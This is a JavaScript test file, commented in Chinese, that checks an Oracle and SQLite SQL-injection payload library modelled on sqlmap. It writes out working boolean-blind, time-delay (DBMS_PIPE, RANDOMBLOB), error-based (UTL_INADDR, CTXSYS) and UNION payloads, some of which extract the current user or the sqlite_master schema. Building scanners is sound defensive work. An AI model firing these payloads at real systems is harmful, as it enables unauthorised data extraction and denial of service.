// Oracle / SQLite payload 库深度扩容验收测试（对标 sqlmap data/xml/payloads）
// 验证：注释符变体（/**/ 结尾）、数字上下文注释变体、DBMS_PIPE 时间注释变体、
// UTL_INADDR / CTXSYS.DRITHSX.SN 报错族、ROWNUM 分页（|| 串联子句注入，Oracle 无堆叠）、
// ORDER BY 除零变体、SQLite UNION 多列探测（NULL/数值/sql 列）、LIKE(HEX(RANDOMBLOB)) 时间重运算；
// 并确认固定索引对 [0,2]/[1,3]/[4,5]/[6,7] 未被破坏（BooleanBlindDetector 依赖，追加只能 append 末尾）。
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { PAYLOADS, fillPayload, CLAUSE_PAYLOADS, DESTRUCTIVE_PAYLOADS } from '../src/engine/payloads.js';

const ORACLE_B = PAYLOADS.Oracle.boolean;
const ORACLE_E = PAYLOADS.Oracle.error;
const ORACLE_T = PAYLOADS.Oracle.time;
const SQLITE_B = PAYLOADS.SQLite.boolean;
const SQLITE_U = PAYLOADS.SQLite.union;
const SQLITE_T = PAYLOADS.SQLite.time;

// —— 通用结构约束：新增模板以 {ORIG} 开头、以 -- - / /**/ 结尾（对齐 sqlmap 边界约定）——
test('Oracle/SQLite 扩容模板结构：新增模板以 {ORIG} 开头且以合法注释结尾', () => {
  const ends = (p) => p.endsWith('-- -') || p.endsWith('/**/');
  // Oracle 新增 boolean（索引 ≥8，排除基础 0-7 无注释形态）
  for (const p of ORACLE_B.slice(8)) {
    assert.ok(p.startsWith('{ORIG}'), `Oracle boolean 新增应以 {ORIG} 开头: ${p}`);
    assert.ok(ends(p), `Oracle boolean 新增应以 -- - / /**/ 结尾: ${p}`);
  }
  for (const p of SQLITE_B.slice(8)) {
    assert.ok(p.startsWith('{ORIG}'), `SQLite boolean 新增应以 {ORIG} 开头: ${p}`);
    assert.ok(ends(p), `SQLite boolean 新增应以 -- - / /**/ 结尾: ${p}`);
  }
  // Oracle error 尾部新增（ROWNUM/UTL_INADDR 向量）：结构约束
  for (const p of ORACLE_E.slice(19)) {
    assert.ok(p.startsWith('{ORIG}'), `Oracle error 新增应以 {ORIG} 开头: ${p}`);
    assert.ok(ends(p), `Oracle error 新增应以 -- - / /**/ 结尾: ${p}`);
  }
  // Oracle time 尾部新增（DBMS_PIPE /**/ 变体）与 SQLite time 尾部新增（LIKE /**/ 变体）
  for (const p of ORACLE_T.slice(13)) {
    assert.ok(ends(p), `Oracle time 新增应以 -- - / /**/ 结尾: ${p}`);
  }
  for (const p of SQLITE_T.slice(6)) {
    assert.ok(p.startsWith('{ORIG}'), `SQLite time 新增应以 {ORIG} 开头: ${p}`);
    assert.ok(ends(p), `SQLite time 新增应以 -- - / /**/ 结尾: ${p}`);
  }
  // SQLite union 新增（多列探测）：结构约束
  for (const p of SQLITE_U.slice(12)) {
    assert.ok(p.startsWith('{ORIG}'), `SQLite union 新增应以 {ORIG} 开头: ${p}`);
    assert.ok(p.endsWith('-- -'), `SQLite union 新增应以 -- - 结尾: ${p}`);
  }
});

// —— 1) 注释符变体（/**/ 结尾；Oracle 与 SQLite 均支持 -- 与 /**/）——
test('Oracle boolean 数组包含 /**/ 注释结尾变体（索引 ≥8，不占前 8 项）', () => {
  assert.ok(ORACLE_B.includes("{ORIG}' AND '1'='1/**/"), 'Oracle boolean 应含 /**/ 注释真条件');
  const idx = ORACLE_B.indexOf("{ORIG}' AND '1'='1/**/");
  assert.ok(idx >= 8, `Oracle /**/ 变体必须位于索引 ≥8（实际 ${idx}）`);
  assert.ok(ORACLE_B.includes("{ORIG}' AND '1'='1"), `Oracle boolean 基础 '1'='1 仍在 [0]`);
});

test('SQLite boolean 数组包含 /**/ 注释结尾变体（索引 ≥8，不占前 8 项）', () => {
  assert.ok(SQLITE_B.includes("{ORIG}' AND '1'='1/**/"), 'SQLite boolean 应含 /**/ 注释真条件');
  const idx = SQLITE_B.indexOf("{ORIG}' AND '1'='1/**/");
  assert.ok(idx >= 8, `SQLite /**/ 变体必须位于索引 ≥8（实际 ${idx}）`);
});

// —— 2) 数字上下文注释变体（-- - 结尾，对标 sqlmap 数字无引号上下文 + 注释清理）——
test('Oracle boolean 数组包含数字上下文注释变体（AND 1=1-- - / AND 1=2-- -）', () => {
  assert.ok(ORACLE_B.includes('{ORIG} AND 1=1-- -'), 'Oracle 数字上下文真条件（-- - 结尾）');
  assert.ok(ORACLE_B.includes('{ORIG} AND 1=2-- -'), 'Oracle 数字上下文假条件（-- - 结尾）');
  const trueIdx = ORACLE_B.indexOf('{ORIG} AND 1=1-- -');
  const falseIdx = ORACLE_B.indexOf('{ORIG} AND 1=2-- -');
  assert.ok(trueIdx >= 8 && falseIdx >= 8, '数字上下文注释变体必须位于索引 ≥8');
});

// —— 3) DBMS_PIPE 时间注释变体（/**/ 结尾，与 -- - 双通道互补）——
test('Oracle time 数组包含 DBMS_PIPE.RECEIVE_MESSAGE /**/ 结尾变体', () => {
  assert.ok(
    ORACLE_T.includes("{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0/**/"),
    'Oracle time 应含 DBMS_PIPE /**/ 注释变体'
  );
  // 填充语义：{SLEEP} 正确替换
  const filled = fillPayload("{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0/**/", { orig: '1', sleep: 3 });
  assert.ok(filled.includes("DBMS_PIPE.RECEIVE_MESSAGE('sqli',3)=0/**/"), `填充后语义正确: ${filled}`);
});

// —— 4) 报错函数族：UTL_INADDR 假主机名（ORA-29257）与 CTXSYS.DRITHSX.SN（核对现有）——
test(`Oracle error 数组包含 UTL_INADDR.GET_HOST_ADDRESS('x') 字面量报错变体`, () => {
  assert.ok(
    ORACLE_E.includes("{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS('x')-- -"),
    'Oracle error 应含 UTL_INADDR.GET_HOST_ADDRESS(\'x\') 字面量报错（ORA-29257）'
  );
  // 既有 CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) 核对（任务要求核对现有，不重复追加）
  assert.ok(
    ORACLE_E.includes("{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -"),
    'CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) 报错向量应存在（核对现有）'
  );
  assert.ok(
    ORACLE_E.includes("{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -"),
    'UTL_INADDR 子查询报错向量应存在'
  );
});

// —— 5) ROWNUM 分页上下文（Oracle 无堆叠 → || 串联子句注入，单语句触发报错）——
test('Oracle error 数组包含 ROWNUM 分页 || 串联注入变体（替代不可行的 ; SELECT 1/0）', () => {
  // Oracle 标准驱动不支持堆叠 → `{ORIG} AND ROWNUM=1; SELECT 1/0 FROM dual` 不可用；
  // 改用 || 串联子句技巧：单语句触发 GET_HOST_ADDRESS 假主机名报错
  assert.ok(
    ORACLE_E.some((p) => p.includes('UTL_INADDR.GET_HOST_ADDRESS') && p.includes('||')),
    'Oracle error 应含 || 串联（ROWNUM 分页适配）报错变体'
  );
  assert.ok(
    ORACLE_E.some((p) => p.includes('ROWNUM=1||') || p.startsWith('{ORIG}||')),
    'Oracle error 应含 ROWNUM 分页/子句注入形态'
  );
});

// —— 6) ORDER BY 除零变体（ORDER BY 位置真假对；假=1/0 触发 ORA-01476）——
test('CLAUSE_PAYLOADS.Oracle.orderby 含 (SELECT 1/0 FROM dual) 除零假模板', () => {
  const pairs = CLAUSE_PAYLOADS.Oracle.orderby.boolean;
  assert.ok(
    pairs.some((pair) => pair[1].includes('(SELECT 1/0 FROM dual)')),
    'Oracle orderby 应含 (SELECT 1/0 FROM dual) 假模板（除零 ORA-01476）'
  );
  // 真假对差一语义：真条件 ≈ 基线（SELECT 1），假条件 ≠ 基线（除零报错）
  const hit = pairs.find((pair) => pair[1].includes('(SELECT 1/0 FROM dual)'));
  assert.ok(hit[0].includes('(SELECT 1 FROM dual)') || hit[0].includes("(SELECT 'a' FROM dual)"), `真模板应为恒真标量子查询: ${hit[0]}`);
});

// —— 7) SQLite UNION 多列探测（NULL + 数值 + sql 列，随机 NULL 与 CAST 混合对标 sqlmap）——
test('SQLite union 数组包含多列探测模板（UNION SELECT NULL,1,sql FROM sqlite_master）', () => {
  assert.ok(
    SQLITE_U.includes('{ORIG} UNION SELECT NULL,1,sql FROM sqlite_master-- -'),
    'SQLite union 应含 NULL/数值/sql 列多列探测'
  );
  const filled = fillPayload('{ORIG} UNION SELECT NULL,1,sql FROM sqlite_master-- -', { orig: '1' });
  assert.ok(filled.startsWith('1 UNION SELECT NULL,1,sql FROM sqlite_master-- -'), `填充后语义正确: ${filled}`);
  assert.ok(filled.includes('UNION SELECT'), '应含标准 UNION SELECT 语法');
});

// —— 8) SQLite 时间重运算（LIKE(HEX(RANDOMBLOB))；50000000 已移入 destructive 池）——
test('SQLite time 数组含 RANDOMBLOB 重运算变体；50000000 在 destructive 池', () => {
  // 默认池含 10000000/25000000 规模的 RANDOMBLOB 重运算变体
  assert.ok(
    SQLITE_T.some((t) => t.includes('RANDOMBLOB') && t.includes('LIKE')),
    'SQLite time 应含 LIKE(RANDOMBLOB) 变体'
  );
  // 50000000 规模已移入 destructive.js（risk≥3 门控，见 payloadSafety.guard.test.js）
  const destTime = DESTRUCTIVE_PAYLOADS.SQLite?.time || [];
  assert.ok(
    destTime.some((t) => t.includes('RANDOMBLOB(50000000)')),
    'destructive 池应含 RANDOMBLOB(50000000) 变体'
  );
  // 与既有 sqlite_master 交叉积向量共存（未破坏原时间向量）
  assert.ok(SQLITE_T[0].includes('sqlite_master'), 'SQLite time 首条仍为 sqlite_master 交叉积向量');
});

// —— 9) 固定索引对未被破坏（BooleanBlindDetector 依赖 [0,2]/[1,3]/[4,5]/[6,7]）——
test('Oracle/SQLite boolean 固定索引对 [0,2]/[1,3]/[4,5]/[6,7] 未被扩容破坏', () => {
  for (const [name, B] of [['Oracle', ORACLE_B], ['SQLite', SQLITE_B]]) {
    assert.ok(B[0].includes("AND '1'='1"), `${name} [0] 应为单引号真条件: ${B[0]}`);
    assert.ok(B[2].includes("AND '1'='2"), `${name} [2] 应为单引号假条件: ${B[2]}`);
    assert.ok(B[1].includes('AND "1"="1'), `${name} [1] 应为双引号真条件: ${B[1]}`);
    assert.ok(B[3].includes('AND "1"="2'), `${name} [3] 应为双引号假条件: ${B[3]}`);
    assert.ok(B[4].includes('AND 1=1'), `${name} [4] 应为数字真条件: ${B[4]}`);
    assert.ok(B[5].includes('AND 1=2'), `${name} [5] 应为数字假条件: ${B[5]}`);
    assert.ok(B[6].includes("OR '1'='1"), `${name} [6] 应为 OR 真条件: ${B[6]}`);
    assert.ok(B[7].includes("OR '1'='2"), `${name} [7] 应为 OR 假条件: ${B[7]}`);
    assert.equal(B.slice(0, 8).length, 8);
  }
});

// —— 10) 追加不破坏数组唯一性（无重复模板且均含 {ORIG}）——
test('扩容后 Oracle/SQLite 数组无重复模板且均含 {ORIG}', () => {
  const groups = [
    ['Oracle.boolean', ORACLE_B],
    ['Oracle.error', ORACLE_E],
    ['Oracle.time', ORACLE_T],
    ['SQLite.boolean', SQLITE_B],
    ['SQLite.time', SQLITE_T],
    ['SQLite.union', SQLITE_U],
  ];
  for (const [name, arr] of groups) {
    const seen = new Set();
    for (const p of arr) {
      assert.ok(typeof p === 'string' && p.includes('{ORIG}'), `[${name}] 缺 {ORIG}: ${p}`);
      assert.ok(!seen.has(p), `[${name}] 存在重复模板: ${p}`);
      seen.add(p);
    }
  }
});

// —— 11) 新增模板数量统计（供实施报告核对）——
test('深度扩容模板数量：Oracle boolean +3 / error +3 / time +1；SQLite boolean +1 / time +1 / union +1', () => {
  // 基线：Oracle boolean 8 / error 20 / time 13；SQLite boolean 8 / time 6 / union 12
  assert.ok(ORACLE_B.length >= 11, `Oracle boolean 应 ≥11 条（8 基础 + 3 扩容），实际 ${ORACLE_B.length}`);
  assert.ok(ORACLE_E.length >= 23, `Oracle error 应 ≥23 条（20 基础 + 3 扩容），实际 ${ORACLE_E.length}`);
  assert.ok(ORACLE_T.length >= 14, `Oracle time 应 ≥14 条（13 基础 + 1 扩容），实际 ${ORACLE_T.length}`);
  assert.ok(SQLITE_B.length >= 9, `SQLite boolean 应 ≥9 条（8 基础 + 1 扩容），实际 ${SQLITE_B.length}`);
  assert.ok(SQLITE_T.length >= 7, `SQLite time 应 ≥7 条（6 基础 + 1 扩容），实际 ${SQLITE_T.length}`);
  assert.ok(SQLITE_U.length >= 13, `SQLite union 应 ≥13 条（12 基础 + 1 扩容），实际 ${SQLITE_U.length}`);
});